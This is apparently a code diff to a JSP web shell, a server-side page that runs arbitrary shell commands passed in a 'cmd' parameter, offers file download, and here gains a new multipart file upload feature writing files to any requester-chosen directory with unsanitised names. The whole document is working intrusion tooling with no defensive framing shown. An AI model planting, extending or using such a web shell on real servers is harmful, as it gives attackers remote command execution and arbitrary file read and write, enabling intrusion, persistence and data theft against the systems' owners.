@@ -1,4 +1,4 @@
-<%@ page import="java.io.BufferedReader,java.io.File,java.io.FileInputStream,java.io.InputStreamReader" trimDirectiveWhitespaces="true" %>
+<%@ page import="java.io.BufferedReader,java.io.ByteArrayOutputStream,java.io.File,java.io.FileInputStream,java.io.FileOutputStream,java.io.InputStreamReader,java.nio.ByteBuffer,java.util.regex.Matcher,java.util.regex.Pattern" trimDirectiveWhitespaces="true" %>
 <%!
     String htmlEscape(String in) {
         return in.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;").replaceAll("\"", "&quot;").replaceAll("'", "&#039;");
@@ -28,6 +28,64 @@
             downloadMsg = "Error accessing file <code>" + htmlEscape(downloadFile) + "</code><br />\n";
         }
     }
+    String uploadMsg = "";
+    String contentType = request.getHeader("Content-Type");
+    if(contentType != null && contentType.startsWith("multipart/form-data")) {
+        byte[] boundary = contentType.substring(30).getBytes("ASCII");
+        ServletInputStream sis = request.getInputStream();
+        byte[] buf = new byte[8192];
+        int c;
+        boolean nextIsContentDisposition = false;
+        boolean nextIsUploadDir = false;
+        boolean nextIsFile = false;
+        String uploadDir = "";
+        String fileName = null;
+        ByteArrayOutputStream baos = null;
+        while((c = sis.readLine(buf, 0, 8192)) != -1) {
+            if(ByteBuffer.wrap(buf, 2, boundary.length).equals(ByteBuffer.wrap(boundary))) {
+                nextIsContentDisposition = true;
+                if(nextIsUploadDir) {
+                    nextIsUploadDir = false;
+                    uploadDir = uploadDir.substring(0, uploadDir.length()-2);
+                    uploadDir = uploadDir.length() > 0 ? uploadDir : ".";
+                    if(! new File(uploadDir).canWrite()) {
+                        uploadMsg += "Cannot write to directory <code>" + htmlEscape(uploadDir) + "</code><br />\n";
+                        break;
+                    }
+                } else if(nextIsFile) {
+                    nextIsFile = false;
+                    File f = new File(uploadDir, fileName);
+                    FileOutputStream fos = new FileOutputStream(f);
+                    fos.write(baos.toByteArray(), 0, baos.size()-2);
+                    fos.close();
+                    uploadMsg += "Successfully uploaded <code>" + htmlEscape(fileName) + "</code> to <code>" + htmlEscape(f.getPath()) + "</code><br />\n";
+                }
+            } else if(nextIsContentDisposition) {
+                nextIsContentDisposition = false;
+                String contentDisposition = new String(buf, 0, c, "UTF-8");
+                Matcher m = Pattern.compile("; name=\"([^\"]*)\"(?:; filename=\"([^\"]*)\")?").matcher(contentDisposition);
+                m.find();
+                String paramName = m.group(1);
+                if(paramName.equals("upload-dir")) {
+                    nextIsUploadDir = true;
+                } else if(paramName.equals("upload-files[]")) {
+                    nextIsFile = true;
+                    fileName = m.group(2);
+                    baos = new ByteArrayOutputStream();
+                }
+                while((c = sis.readLine(buf, 0, 8192)) != -1) {
+                    if(new String(buf, 0, c, "UTF-8").trim().length() == 0) {
+                        break;
+                    }
+                }
+            } else if(nextIsUploadDir) {
+                uploadDir += new String(buf, 0, c, "UTF-8");
+            } else if(nextIsFile) {
+                baos.write(buf, 0, c);
+            }
+        }
+        sis.close();
+    }
     String shell = null;
     String shellOpt = null;
     String cmd = request.getParameter("cmd");
@@ -46,7 +104,7 @@
         pb.redirectErrorStream(true);
         Process p = pb.start();
         BufferedReader stdoutReader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-        String s = null;
+        String s;
         while((s = stdoutReader.readLine()) != null) {
             stdout.append(s).append(System.getProperty("line.separator"));
         }
@@ -99,6 +157,17 @@
         out.println("Exit code: <code>" + exitCode + "</code>");
     }
 %>
+        </div>
+        <div class="feature-box">
+            <b>File Upload</b>
+            <div>
+<%= uploadMsg %>
+            </div>
+            <form method="POST" action="" enctype="multipart/form-data">
+                <input type="text" name="upload-dir" placeholder="Destination folder" />
+                <input type="file" name="upload-files[]" multiple="multiple" />
+                <input type="submit" name="submit-upload" value="Upload" />
+            </form>
         </div>
         <div class="feature-box">
             <b>File Download</b>
